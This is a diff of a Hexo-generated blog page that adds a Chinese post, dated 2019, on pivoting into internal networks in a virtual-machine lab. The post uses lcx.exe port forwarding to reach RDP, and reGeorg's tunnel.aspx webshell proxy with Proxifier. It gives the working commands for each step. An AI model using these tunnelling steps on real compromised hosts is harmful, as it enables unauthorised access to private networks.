@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>violin&#39;s blog</title>
+    <title>提权学习（二） · violin&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >violin</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">提权学习（二）</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>violin</a>
 </header>
@@ -220,24 +231,69 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            提权学习（二）
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "提权">提权</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">898</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/07/11</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,39 +394,91 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/08/imgtest/" >
-            
-                <span>hexo写文章教程</span>
-        </a>
-        <div class="abstract-content">
-            <p>hexo写博客文章简易教程
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/08</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "hexo">hexo</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="lcx实现端口转发"><a href="#lcx实现端口转发" class="headerlink" title="lcx实现端口转发"></a>lcx实现端口转发</h2><p><strong>场景</strong>：服务器处于内网，可以访问外部网络</p>
+<p>将lcx上传到目标服务器，然后运行如下命令：</p>
+<p><code>lcx.exe -slave 攻击者监听的IP 监听的端口 受害者IP 需要转发的端口</code></p>
+<p><code>lcx.exe -slave 192.168.0.111 51 192.168.0.34 3389</code><a id="more"></a></p>
+<img src="/2019/07/11/提权学习（二）/1562765325789.png" title="img_tq">
+
+<p>然后在外部进行监听：</p>
+<p><code>lcx.exe -listen 51 1234</code></p>
+<img src="/2019/07/11/提权学习（二）/1562765576617.png" title="img_tq">
+
+<p>然后用<code>mstsc</code>连接本地的1234端口：</p>
+<img src="/2019/07/11/提权学习（二）/1562765710402.png" title="img_tq">
+
+<p>成功连接到目标主机。</p>
+<h2 id="reGeorg-Proxifier实现内网穿透"><a href="#reGeorg-Proxifier实现内网穿透" class="headerlink" title="reGeorg+Proxifier实现内网穿透"></a>reGeorg+Proxifier实现内网穿透</h2><p><strong>场景</strong>：</p>
+<p>1、一台服务器可以连接外网</p>
+<p>2、服务器和内网之间可以相互访问</p>
+<p>3、外网无法访问内部网络</p>
+<p>突破：在服务器上架设代理，然后通过代理访问内网，实现内网穿透</p>
+<p>假设已经拿到一台服务器的webshell，然后我们上传我们的代理工具<code>reGeorg(tunnel.aspx)</code>，然后访问：</p>
+<img src="/2019/07/11/提权学习（二）/1562831839326.png" title="img_tq">
+
+<p>看到如上的说明成功。然后在攻击主机上执行如下的命令,开启本地的监听端口，并转发流量：</p>
+<p><code>python2 reGeorgSocksProxy.py -u http://192.168.112.129/tunnel.aspx -p 12345</code></p>
+<p>然后就可以通过Proxifier进行连接代理了。</p>
+<p>在配置文件-》代理服务器-》添加中输入如下的信息，即代理的服务器和端口，选择socks5：</p>
+<img src="/2019/07/11/提权学习（二）/1562832097110.png" title="img_tq">
+
+<p>确定之后，在配置文件-》配置规则-》添加中选择需要代理的应用程序（如Firefox，mstsc等），在动作的位置选择对应的流量的动作，即代理模式（有：代理模式、直接连接模式、阻断流量模式）。</p>
+<img src="/2019/07/11/提权学习（二）/1562832248039.png" title="img_tq">
+
+<p>添加之后表示之后使用该应用程序之后的流量都将通过代理进行转发，从而可以达到内网。确认之后就可以通过添加的应用程序对内网的资源访问，如下：</p>
+<img src="/2019/07/11/提权学习（二）/1562832458718.png" title="img_tq">
+
+<p>为了更加清晰理解我们的流量走向以及代理的效果，我们来通过本机访问一下处于内网的资源。</p>
+<img src="/2019/07/11/提权学习（二）/1562832965757.png" title="img_tq">
+
+<p>然后仔细查看一下连接，首先，在本机上查看一下端口连接情况：</p>
+<img src="/2019/07/11/提权学习（二）/1562832705965.png" title="img_tq">
+
+<p>可以看到本地12345端口一直出于监听的状态。然后我们进入我们架设了代理的服务器看一下端口连接情况：</p>
+<img src="/2019/07/11/提权学习（二）/1562833085986.png" title="img_tq">
+
+<p>可以看到，服务器的80端口一直与192.168.112.1（本实验环境为虚拟机，该IP为虚拟网关）的13395、13396端口保持着连接，也就是我们通过</p>
+<p><code>reGeorgSocksProxy.py</code>脚本建立的连接。由于我们访问一下内网的资源（<code>http://192.168.112.131:8888/</code>），服务器便通过49227端口向内网的服务器192.168.112.131的8888端口建立了请求连接。</p>
+<p>我们再到内网的192.168.112.131服务器上查看一下连接情况：</p>
+<img src="/2019/07/11/提权学习（二）/1562833412881.png" title="img_tq">
+
+<p>可以看到连接8888端口的外部的地址为我们的代理服务器192.168.112.129，而不是我们本机的IP 。</p>
+<p>所以经过对整个过程流量的正确追踪可以得到流量的流向为：</p>
+<p>Proxifier将流量发送到127.0.0.1（本机）的12345端口，由于我们使用<code>reGeorgSocksProxy.py</code>在本地对发往的12345端口的流量做了转发，将流量通过HTTP的方式发送的代理服务器<code>http://192.168.112.129/tunnel.aspx</code>上，然后代理服务器再对我们的流量进行转发到内网的主机上，从而实现了内网的突破。当然这整个过程对我们都是透明的，我们连接到代理后可以直接通过Proxifier对内网的服务进行访问即可。</p>
+
     </article>
+    <!-- license  -->
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/07/10/redis-未授权RCE复现/" title= "redis 未授权RCE复现">
+                    <div class="prevTitle">redis 未授权RCE复现</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -439,6 +547,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#lcx实现端口转发"><span class="toc-number">1.</span> <span class="toc-text">lcx实现端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reGeorg-Proxifier实现内网穿透"><span class="toc-number">2.</span> <span class="toc-text">reGeorg+Proxifier实现内网穿透</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -602,6 +728,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
